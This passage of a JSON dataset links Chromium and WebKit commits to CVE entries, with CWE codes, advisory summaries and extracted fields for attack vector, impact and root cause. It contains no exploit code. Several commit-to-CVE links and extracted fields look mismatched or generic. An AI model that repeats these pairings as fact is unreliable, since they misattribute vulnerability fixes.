url","Attack Type":"remote attacker"},{"commit_id":"744c2a2d90c3c9a33c818e1ea4b7ccb5010663a0","cve_id":"CVE-2011-3084","cwe_id":"CWE-264","commit_message":"Allow browser to handle all WebUI navigations.\n\nBUG=113496\nTEST=\"Google Dashboard\" link in Sync settings loads in new process.\n\n\nReview URL: http:\/\/codereview.chromium.org\/9663045\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@126949 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 19.0.1084.46 does not use a dedicated process for the loading of links found on an internal page, which might allow attackers to bypass intended sandbox restrictions via a crafted page.","commit_message_1":"allow browser to handle all webui navigation","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted page","Impact":"bypass intended sandbox restrictions","Root Cause":"does not use a dedicated process for the loading of links found on an internal page","Attack Type":"remote attacker"},{"commit_id":"c7e50b5ef454efd6ab9527d795442c213eeb6afa","cve_id":"CVE-2011-3085","cwe_id":"CWE-119","commit_message":"[REGRESSION] Refreshed autofill popup renders garbage\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=83255\nhttp:\/\/code.google.com\/p\/chromium\/issues\/detail?id=118374\n\nThe code used to update only the PopupContainer coordinates as if they were the coordinates relative\nto the root view. Instead, a WebWidget positioned relative to the screen origin holds the PopupContainer,\nso it is the WebWidget that should be positioned in PopupContainer::refresh(), and the PopupContainer's\nlocation should be (0, 0) (and their sizes should always be equal).\n\nReviewed by Kent Tamura.\n\nNo new tests, as the popup appearance is not testable in WebKit.\n\n* platform\/chromium\/PopupContainer.cpp:\n(WebCore::PopupContainer::layoutAndCalculateWidgetRect): Variable renamed.\n(WebCore::PopupContainer::showPopup): Use m_originalFrameRect rather than frameRect()\nfor passing into chromeClient.\n(WebCore::PopupContainer::showInRect): Set up the correct frameRect() for the container.\n(WebCore::PopupContainer::refresh): Resize the container and position the WebWidget correctly.\n* platform\/chromium\/PopupContainer.h:\n(PopupContainer):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@113418 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The Autofill feature in Google Chrome before 19.0.1084.46 does not properly restrict field values, which allows remote attackers to cause a denial of service (UI corruption) and possibly conduct spoofing attacks via vectors involving long values.","commit_message_1":"refreshed autofill popup render garbage http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving long values","Impact":"cause a denial of service ( ui corruption ) and possibly conduct spoofing attacks","Root Cause":"does not properly restrict field values","Attack Type":"remote attacker"},{"commit_id":"58436a1770176ece2c02b28a57bba2a89db5d58b","cve_id":"CVE-2011-3087","cwe_id":null,"commit_message":"Use a new scheme for swapping out RenderViews.\n\nBUG=118664\nTEST=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/9720004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@127986 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 19.0.1084.46 does not properly perform window navigation, which has unspecified impact and remote attack vectors.","commit_message_1":"use a new scheme for swapping out renderviews","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not properly perform window navigation","Attack Type":"remote attacker"},{"commit_id":"1dab554a7e795dac34313e2f7dbe4325628d12d4","cve_id":"CVE-2011-3088","cwe_id":"CWE-119","commit_message":"Lands http:\/\/codereview.chromium.org\/9316065\/ for Marja. I reviewed\nthis, so I'm using TBR to land it.\n\nDon't crash if multiple SessionRestoreImpl:s refer to the same\nProfile.\n\nIt shouldn't ever happen but it seems to happen anyway.\n\nBUG=111238\nTEST=NONE\nTBR=sky@chromium.org\nR=marja@chromium.org\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9343005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@120648 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 19.0.1084.46 does not properly draw hairlines, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"for marja","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly draw hairlines","Attack Type":"remote attacker"},{"commit_id":"cc7cde43832b547cdab856fe1bedc9514ca38e13","cve_id":"CVE-2011-3091","cwe_id":"CWE-399","commit_message":"Add DCHECK to ensure IndexedDBDispatcher doesn't get re-created.\n\nThis could happen if there are IDB objects that survive the call to\ndidStopWorkerRunLoop.\n\nBUG=121734\nTEST=\n\n\nReview URL: http:\/\/codereview.chromium.org\/9999035\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@131679 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the IndexedDB implementation in Google Chrome before 19.0.1084.46 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"add dcheck to ensure indexeddbdispatcher doe n't get re-created","Vulnerability Type":"use - after - free","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within indexed DB","Attack Type":"remote attacker"},{"commit_id":"b8573aa643b03a59f4e2c99c72d3511a11cfb0b6","cve_id":"CVE-2011-3094","cwe_id":"CWE-20","commit_message":"Add setters for the aura gesture recognizer constants.\nBUG=113227\nTEST=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/9372040\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@122586 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 19.0.1084.46 does not properly handle Tibetan text, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"add setter for the aura gesture recognizer constant","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle tibetan text","Attack Type":"remote attacker"},{"commit_id":"9fe90fe465e046a219411b192d8b08086faae39c","cve_id":"CVE-2011-3096","cwe_id":"CWE-399","commit_message":"GTK: Stop listening to gtk signals in the omnibox before destroying the model.\n\nBUG=123530\nTEST=none\n\n\nReview URL: http:\/\/codereview.chromium.org\/10103012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@132498 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 19.0.1084.46 on Linux allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging an error in the GTK implementation of the omnibox.","commit_message_1":"stop listening to gtk signal in the omnibox before destroying the model","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging an error in the gtk implementation of the omnibox","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within GTK omnibox handling","Attack Type":"remote attacker"},{"commit_id":"027429ee5abe6e2fb5e3b2b4542f0a6fe0dbc12d","cve_id":"CVE-2011-3097","cwe_id":"CWE-20","commit_message":"Metrics for measuring how much overhead reading compressed content states adds.\n\nBUG=104293\nTEST=NONE\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9426039\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@123733 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 19.0.1084.46 allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging an out-of-bounds write error in the implementation of sampled functions.","commit_message_1":"metric for measuring how much overhead reading compressed content state add","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging an out - of - bounds write error in the implementation of sampled functions","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"3bbc818ed1a7b63b8290bbde9ae975956748cb8a","cve_id":"CVE-2011-3099","cwe_id":"CWE-399","commit_message":"[GTK] Inspector should set a default attached height before being attached\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=90767\n\nReviewed by Xan Lopez.\n\nWe are currently using the minimum attached height in\nWebKitWebViewBase as the default height for the inspector when\nattached. It would be easier for WebKitWebViewBase and embedders\nimplementing attach() if the inspector already had an attached\nheight set when it's being attached.\n\n* UIProcess\/API\/gtk\/WebKitWebViewBase.cpp:\n(webkitWebViewBaseContainerAdd): Don't initialize\ninspectorViewHeight.\n(webkitWebViewBaseSetInspectorViewHeight): Allow to set the\ninspector view height before having an inpector view, but only\nqueue a resize when the view already has an inspector view.\n* UIProcess\/API\/gtk\/tests\/TestInspector.cpp:\n(testInspectorDefault):\n(testInspectorManualAttachDetach):\n* UIProcess\/gtk\/WebInspectorProxyGtk.cpp:\n(WebKit::WebInspectorProxy::platformAttach): Set the default\nattached height before attach the inspector view.\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@124479 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the PDF functionality in Google Chrome before 19.0.1084.46 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving a malformed name for the font encoding.","commit_message_1":"inspector should set a default attached height before being attached http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving a malformed name for the font encoding","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within PDF with corrupt font encoding name","Attack Type":"remote attacker"},{"commit_id":"8f0b86c2fc77fca1508d81314f864011abe25f04","cve_id":"CVE-2011-3101","cwe_id":null,"commit_message":"Always write data to new buffer in SimulateAttrib0\n\nThis is to work around linux nvidia driver bug.\n\nTEST=asan\nBUG=118970\n\n\nReview URL: http:\/\/codereview.chromium.org\/10019003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@131538 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 19.0.1084.46 on Linux does not properly mitigate an unspecified flaw in an NVIDIA driver, which has unknown impact and attack vectors.  NOTE: see CVE-2012-3105 for the related MFSA 2012-34 issue in Mozilla products.","commit_message_1":"always write data to new buffer in simulateattrib0 this is to work around linux nvidia driver bug","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not properly mitigate an unspecified flaw","Attack Type":"remote attacker"},{"commit_id":"4c46d7a5b0af9b7d320e709291b270ab7cf07e83","cve_id":"CVE-2011-3102","cwe_id":"CWE-189","commit_message":"Fix XPointer bug.\n\nBUG=125462\nAUTHOR=asd@ut.ee\nR=cevans@chromium.org\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10344022\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@135174 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Off-by-one error in libxml2, as used in Google Chrome before 19.0.1084.46 and other products, allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix xpointer bug","Vulnerability Type":"Off-by-one error","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds write ) or possibly have unspecified other impact","Root Cause":"caused by an error within libxml","Attack Type":"remote attacker"},{"commit_id":"3da579b85a36e95c03d06b7c4ce9d618af4107bf","cve_id":"CVE-2011-3050","cwe_id":"CWE-399","commit_message":"Relands cl 16982 as it wasn't the cause of the build breakage. Here's\nthe description for that cl:\n\nLands http:\/\/codereview.chromium.org\/115505 for bug\nhttp:\/\/crbug.com\/4030 for tyoshino.\n\nBUG=http:\/\/crbug.com\/4030\nTEST=make sure control-w dismisses bookmark manager.\n\nReview URL: http:\/\/codereview.chromium.org\/113902\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@16987 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the Cascading Style Sheets (CSS) implementation in Google Chrome before 17.0.963.83 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the :first-letter pseudo-element.","commit_message_1":"relands cl <number> a it wa n't the cause of the build breakage","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the : first - letter pseudo - element","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error when handling the first letter","Attack Type":"remote attacker"},{"commit_id":"4cf106cdb83dd6b35d3b26d06cc67d1d2d99041e","cve_id":"CVE-2011-3045","cwe_id":"CWE-189","commit_message":"Pull follow-up tweak from upstream.\n\nBUG=116162\n\nReview URL: http:\/\/codereview.chromium.org\/9546033\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@125311 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer signedness error in the png_inflate function in pngrutil.c in libpng before 1.4.10beta01, as used in Google Chrome before 17.0.963.83 and other products, allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PNG file, a different vulnerability than CVE-2011-3026.","commit_message_1":"pull follow-up tweak from upstream","Vulnerability Type":"integer signedness error","Attack Vector":"via a crafted png file","Impact":"cause a denial of service ( application crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the png_inflate() function","Attack Type":"remote attacker"},{"commit_id":"d66c757a9a434f48069b114fb49191e4790f9038","cve_id":"CVE-2011-3051","cwe_id":"CWE-399","commit_message":"cleanup: Use IsTextInputTypeNone() in OnInputMethodChanged().\n\nBUG=None\nTEST=None\n\n\nReview URL: http:\/\/codereview.chromium.org\/8986010\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@116461 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the Cascading Style Sheets (CSS) implementation in Google Chrome before 17.0.963.83 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the cross-fade function.","commit_message_1":"cleanup : use istextinputtypenone ( ) in oninputmethodchanged ( )","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the cross - fade function","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error when handling CSS cross-fade","Attack Type":"remote attacker"},{"commit_id":"64681e22e73e3325e06e6e5e8ef81995b4a306cc","cve_id":"CVE-2011-3052","cwe_id":"CWE-119","commit_message":"Fix mismanagement in handling of temporary scanline for vertical flip.\n\nBUG=116637\nTEST=manual test from bug report with ASAN\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9617038\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@125301 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The WebGL implementation in Google Chrome before 17.0.963.83 does not properly handle CANVAS elements, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix mismanagement in handling of temporary scanline for vertical flip","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not properly handle canvas elements","Attack Type":"remote attacker"},{"commit_id":"c442b3eda2f1fdd4d1d4864c34c43cbaf223acae","cve_id":"CVE-2011-3053","cwe_id":"CWE-399","commit_message":"chromeos: Move audio, power, and UI files into subdirs.\n\nThis moves more files from chrome\/browser\/chromeos\/ into\nsubdirectories.\n\nBUG=chromium-os:22896\nTEST=did chrome os builds both with and without aura\nTBR=sky\n\nReview URL: http:\/\/codereview.chromium.org\/9125006\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@116746 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 17.0.963.83 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to block splitting.","commit_message_1":"move audio , power , and ui file into subdirs","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to block splitting","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free within block splitting","Attack Type":"remote attacker"},{"commit_id":"e9372a1bfd3588a80fcf49aa07321f0971dd6091","cve_id":"CVE-2011-3055","cwe_id":null,"commit_message":"[V8] Pass Isolate to throwNotEnoughArgumentsError()\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=86983\n\nReviewed by Adam Barth.\n\nThe objective is to pass Isolate around in V8 bindings.\nThis patch passes Isolate to throwNotEnoughArgumentsError().\n\nNo tests. No change in behavior.\n\n* bindings\/scripts\/CodeGeneratorV8.pm:\n(GenerateArgumentsCountCheck):\n(GenerateEventConstructorCallback):\n* bindings\/scripts\/test\/V8\/V8Float64Array.cpp:\n(WebCore::Float64ArrayV8Internal::fooCallback):\n* bindings\/scripts\/test\/V8\/V8TestActiveDOMObject.cpp:\n(WebCore::TestActiveDOMObjectV8Internal::excitingFunctionCallback):\n(WebCore::TestActiveDOMObjectV8Internal::postMessageCallback):\n* bindings\/scripts\/test\/V8\/V8TestCustomNamedGetter.cpp:\n(WebCore::TestCustomNamedGetterV8Internal::anotherFunctionCallback):\n* bindings\/scripts\/test\/V8\/V8TestEventConstructor.cpp:\n(WebCore::V8TestEventConstructor::constructorCallback):\n* bindings\/scripts\/test\/V8\/V8TestEventTarget.cpp:\n(WebCore::TestEventTargetV8Internal::itemCallback):\n(WebCore::TestEventTargetV8Internal::dispatchEventCallback):\n* bindings\/scripts\/test\/V8\/V8TestInterface.cpp:\n(WebCore::TestInterfaceV8Internal::supplementalMethod2Callback):\n(WebCore::V8TestInterface::constructorCallback):\n* bindings\/scripts\/test\/V8\/V8TestMediaQueryListListener.cpp:\n(WebCore::TestMediaQueryListListenerV8Internal::methodCallback):\n* bindings\/scripts\/test\/V8\/V8TestNamedConstructor.cpp:\n(WebCore::V8TestNamedConstructorConstructorCallback):\n* bindings\/scripts\/test\/V8\/V8TestObj.cpp:\n(WebCore::TestObjV8Internal::voidMethodWithArgsCallback):\n(WebCore::TestObjV8Internal::intMethodWithArgsCallback):\n(WebCore::TestObjV8Internal::objMethodWithArgsCallback):\n(WebCore::TestObjV8Internal::methodWithSequenceArgCallback):\n(WebCore::TestObjV8Internal::methodReturningSequenceCallback):\n(WebCore::TestObjV8Internal::methodThatRequiresAllArgsAndThrowsCallback):\n(WebCore::TestObjV8Internal::serializedValueCallback):\n(WebCore::TestObjV8Internal::idbKeyCallback):\n(WebCore::TestObjV8Internal::optionsObjectCallback):\n(WebCore::TestObjV8Internal::methodWithNonOptionalArgAndOptionalArgCallback):\n(WebCore::TestObjV8Internal::methodWithNonOptionalArgAndTwoOptionalArgsCallback):\n(WebCore::TestObjV8Internal::methodWithCallbackArgCallback):\n(WebCore::TestObjV8Internal::methodWithNonCallbackArgAndCallbackArgCallback):\n(WebCore::TestObjV8Internal::overloadedMethod1Callback):\n(WebCore::TestObjV8Internal::overloadedMethod2Callback):\n(WebCore::TestObjV8Internal::overloadedMethod3Callback):\n(WebCore::TestObjV8Internal::overloadedMethod4Callback):\n(WebCore::TestObjV8Internal::overloadedMethod5Callback):\n(WebCore::TestObjV8Internal::overloadedMethod6Callback):\n(WebCore::TestObjV8Internal::overloadedMethod7Callback):\n(WebCore::TestObjV8Internal::overloadedMethod11Callback):\n(WebCore::TestObjV8Internal::overloadedMethod12Callback):\n(WebCore::TestObjV8Internal::enabledAtRuntimeMethod1Callback):\n(WebCore::TestObjV8Internal::enabledAtRuntimeMethod2Callback):\n(WebCore::TestObjV8Internal::convert1Callback):\n(WebCore::TestObjV8Internal::convert2Callback):\n(WebCore::TestObjV8Internal::convert3Callback):\n(WebCore::TestObjV8Internal::convert4Callback):\n(WebCore::TestObjV8Internal::convert5Callback):\n(WebCore::TestObjV8Internal::strictFunctionCallback):\n(WebCore::V8TestObj::constructorCallback):\n* bindings\/scripts\/test\/V8\/V8TestSerializedScriptValueInterface.cpp:\n(WebCore::TestSerializedScriptValueInterfaceV8Internal::acceptTransferListCallback):\n(WebCore::V8TestSerializedScriptValueInterface::constructorCallback):\n* bindings\/v8\/ScriptController.cpp:\n(WebCore::setValueAndClosePopupCallback):\n* bindings\/v8\/V8Proxy.cpp:\n(WebCore::V8Proxy::throwNotEnoughArgumentsError):\n* bindings\/v8\/V8Proxy.h:\n(V8Proxy):\n* bindings\/v8\/custom\/V8AudioContextCustom.cpp:\n(WebCore::V8AudioContext::constructorCallback):\n* bindings\/v8\/custom\/V8DataViewCustom.cpp:\n(WebCore::V8DataView::getInt8Callback):\n(WebCore::V8DataView::getUint8Callback):\n(WebCore::V8DataView::setInt8Callback):\n(WebCore::V8DataView::setUint8Callback):\n* bindings\/v8\/custom\/V8DirectoryEntryCustom.cpp:\n(WebCore::V8DirectoryEntry::getDirectoryCallback):\n(WebCore::V8DirectoryEntry::getFileCallback):\n* bindings\/v8\/custom\/V8IntentConstructor.cpp:\n(WebCore::V8Intent::constructorCallback):\n* bindings\/v8\/custom\/V8SVGLengthCustom.cpp:\n(WebCore::V8SVGLength::convertToSpecifiedUnitsCallback):\n* bindings\/v8\/custom\/V8WebGLRenderingContextCustom.cpp:\n(WebCore::getObjectParameter):\n(WebCore::V8WebGLRenderingContext::getAttachedShadersCallback):\n(WebCore::V8WebGLRenderingContext::getExtensionCallback):\n(WebCore::V8WebGLRenderingContext::getFramebufferAttachmentParameterCallback):\n(WebCore::V8WebGLRenderingContext::getParameterCallback):\n(WebCore::V8WebGLRenderingContext::getProgramParameterCallback):\n(WebCore::V8WebGLRenderingContext::getShaderParameterCallback):\n(WebCore::V8WebGLRenderingContext::getUniformCallback):\n(WebCore::vertexAttribAndUniformHelperf):\n(WebCore::uniformHelperi):\n(WebCore::uniformMatrixHelper):\n* bindings\/v8\/custom\/V8WebKitMutationObserverCustom.cpp:\n(WebCore::V8WebKitMutationObserver::constructorCallback):\n(WebCore::V8WebKitMutationObserver::observeCallback):\n* bindings\/v8\/custom\/V8WebSocketCustom.cpp:\n(WebCore::V8WebSocket::constructorCallback):\n(WebCore::V8WebSocket::sendCallback):\n* bindings\/v8\/custom\/V8XMLHttpRequestCustom.cpp:\n(WebCore::V8XMLHttpRequest::openCallback):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@117736 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The browser native UI in Google Chrome before 17.0.963.83 does not require user confirmation before an unpacked extension installation, which allows user-assisted remote attackers to have an unspecified impact via a crafted extension.","commit_message_1":"pas isolate to thrownotenoughargumentserror ( ) http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"via a crafted extension","Impact":"have an unspecified impact","Root Cause":"does not require user confirmation before an unpacked extension installation","Attack Type":"remote attacker"},{"commit_id":"22503495dc014e883d1041f6b9d883a1a53f3e55","cve_id":"CVE-2011-3049","cwe_id":"CWE-264","commit_message":"Use GURL::Replacements to trim query and ref from URL\n\n\nBUG=108648\nTEST=no\n\n\nReview URL: http:\/\/codereview.chromium.org\/9120011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@116960 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 17.0.963.83 does not properly restrict the extension web request API, which allows remote attackers to cause a denial of service (disrupted system requests) via a crafted extension.","commit_message_1":"to trim query and ref from url bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted extension","Impact":"cause a denial of service ( disrupted system requests )","Root Cause":"does not properly restrict the extension web request api","Attack Type":"remote attacker"},{"commit_id":"67e38708af8e99569365326e378b806088c83f5a","cve_id":"CVE-2011-3046","cwe_id":"CWE-20","commit_message":"Don't put the error URL in the chrome:\/\/ scheme.\n\nBUG=117230\nTEST=none\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/9632002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@125635 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The extension subsystem in Google Chrome before 17.0.963.78 does not properly handle history navigation, which allows remote attackers to execute arbitrary code by leveraging a *Universal XSS (UXSS)* issue.","commit_message_1":"do n't put the error url in the chrome : \/\/ scheme","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging a * universal xss ( uxss ) * issue","Impact":"execute arbitrary code","Root Cause":"does not properly handle history navigation","Attack Type":"remote attacker"},{"commit_id":"f28ccd0b2709832d05156bd107d29d48a4a440cc","cve_id":"CVE-2013-6632","cwe_id":"CWE-189","commit_message":"content: Refactor ChildThreadImpl::Options\n\nRefactor the way options are passed to ChildThreadImpl to make the\ncall sites easier to read and to make it easier to add a task runner\nparameter later.\n\nBUG=444764\n\nReview URL: https:\/\/codereview.chromium.org\/974933002\n\nCr-Commit-Position: refs\/heads\/master@{#319117}","summary":"Integer overflow in Google Chrome before 31.0.1650.57 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors, as demonstrated during a Mobile Pwn2Own competition at PacSec 2013.","commit_message_1":"refactor childthreadimpl : :options refactor the way option are passed to childthreadimpl to make the call site easier to read and to make it easier to add a task runner parameter later","Vulnerability Type":"integer overflow","Attack Vector":"via unspecified vectors , as demonstrated during a mobile pwn2own competition at pacsec 2013","Impact":"execute arbitrary code or cause a denial of service ( memory corruption )","Root Cause":"caused by multiple unspecified errors","Attack Type":"remote attacker"},{"commit_id":"50370b3c98047bdc80184ff87a502edc5c597d3a","cve_id":"CVE-2013-6634","cwe_id":"CWE-287","commit_message":"During redirects in the one click sign in flow, check the current URL\ninstead of original URL to validate gaia http headers.\n\nBUG=307159\n\nReview URL: https:\/\/codereview.chromium.org\/77343002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@236563 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The OneClickSigninHelper::ShowInfoBarIfPossible function in browser\/ui\/sync\/one_click_signin_helper.cc in Google Chrome before 31.0.1650.63 uses an incorrect URL during realm validation, which allows remote attackers to conduct session fixation attacks and hijack web sessions by triggering improper sync after a 302 (aka Found) HTTP status code.","commit_message_1":"during redirects in the one click sign in flow , check the current url instead of original url to validate gaia http header","Vulnerability Type":"Improper Authentication","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"hijack a valid user's session","Root Cause":"caused by the improper handling of the 302 HTTP status","Attack Type":"remote attacker"},{"commit_id":"5cfe3023574666663d970ce48cdbc8ed15ce61d9","cve_id":"CVE-2013-6636","cwe_id":"CWE-20","commit_message":"Clear out some minor TODOs.\n\nBUG=none\n\nReview URL: https:\/\/codereview.chromium.org\/1047063002\n\nCr-Commit-Position: refs\/heads\/master@{#322959}","summary":"The FrameLoader::notifyIfInitialDocumentAccessed function in core\/loader\/FrameLoader.cpp in Blink, as used in Google Chrome before 31.0.1650.63, makes an incorrect check for an empty document during presentation of a modal dialog, which allows remote attackers to spoof the address bar via vectors involving the document.write method.","commit_message_1":"clear out some minor todos","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors involving the document","Impact":"spoof the address","Root Cause":"make an incorrect check for an empty document during presentation of a modal dialog","Attack Type":"remote attacker"},{"commit_id":"4039d2fcaab746b6c20017ba9bb51c3a2403a76c","cve_id":"CVE-2013-6621","cwe_id":"CWE-399","commit_message":"Add logging to figure out which IPC we're failing to deserialize in RenderFrame.\n\nBUG=369553\nR=creis@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/263833020\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@268565 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 31.0.1650.48 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the x-webkit-speech attribute in a text INPUT element.","commit_message_1":"add logging to figure out which ipc we 're failing to deserialize in renderframe","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the x - webkit - speech attribute in a text input element","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to speech input elements","Attack Type":"remote attacker"},{"commit_id":"9fd9d629fcf836bb0d6210015d33a299cf6bca34","cve_id":"CVE-2013-6623","cwe_id":"CWE-119","commit_message":"Make the policy fetch for first time login blocking\n\nThe CL makes policy fetching for first time login blocking for all users, except the ones that are known to be non-enterprise users.\n\nBUG=334584\n\nReview URL: https:\/\/codereview.chromium.org\/330843002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@282925 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The SVG implementation in Blink, as used in Google Chrome before 31.0.1650.48, allows remote attackers to cause a denial of service (out-of-bounds read) by leveraging the use of tree order, rather than transitive dependency order, for layout.","commit_message_1":"make the policy fetch for first time login blocking the cl make policy fetching for first time login blocking for all user , except the one that are known to be non-enterprise user","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the use of tree order , rather than transitive dependency order , for layout ","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"36773850210becda3d76f27285ecd899fafdfc72","cve_id":"CVE-2013-6624","cwe_id":"CWE-399","commit_message":"Fix tracking of the id attribute string if it is shared across elements.\n\nThe patch to remove AtomicStringImpl:\nhttp:\/\/src.chromium.org\/viewvc\/blink?view=rev&rev=154790\n\nExposed a lifetime issue with strings for id attributes. We simply need to use\nAtomicString.\n\nBUG=290566\n\nReview URL: https:\/\/codereview.chromium.org\/33793004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@160250 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 31.0.1650.48 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving the string values of id attributes.","commit_message_1":"fix tracking of the id attribute string if it is shared across element","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving the string values of id attributes","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free vulnerability related to \"id\" attribute strings","Attack Type":"remote 